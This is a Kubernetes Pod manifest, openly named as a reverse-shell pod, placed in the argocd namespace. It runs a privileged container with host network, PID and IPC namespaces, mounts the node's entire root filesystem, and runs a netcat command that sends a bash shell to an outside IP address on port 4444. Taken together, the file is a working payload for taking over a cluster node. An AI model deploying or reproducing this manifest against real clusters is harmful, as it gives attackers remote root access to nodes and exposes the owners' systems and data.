apiVersion: v1
kind: Pod
metadata:
  name: reverse-shell-pod
  namespace: argocd
  labels:
    app: reverse-shell
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  restartPolicy: Never
  containers:
    - name: reverse-shell
      image: ubuntu:latest
      command: ["/bin/bash", "-c", "--"]
      args: ["nc 23.27.169.114 4444 -e /bin/bash;"]
      securityContext:
        privileged: true  # Set to false unless needed
      tty: true
      stdin: true
      volumeMounts:
        - mountPath: /host
          name: noderoot
  volumes:
    - name: noderoot
      hostPath:
        path: /        
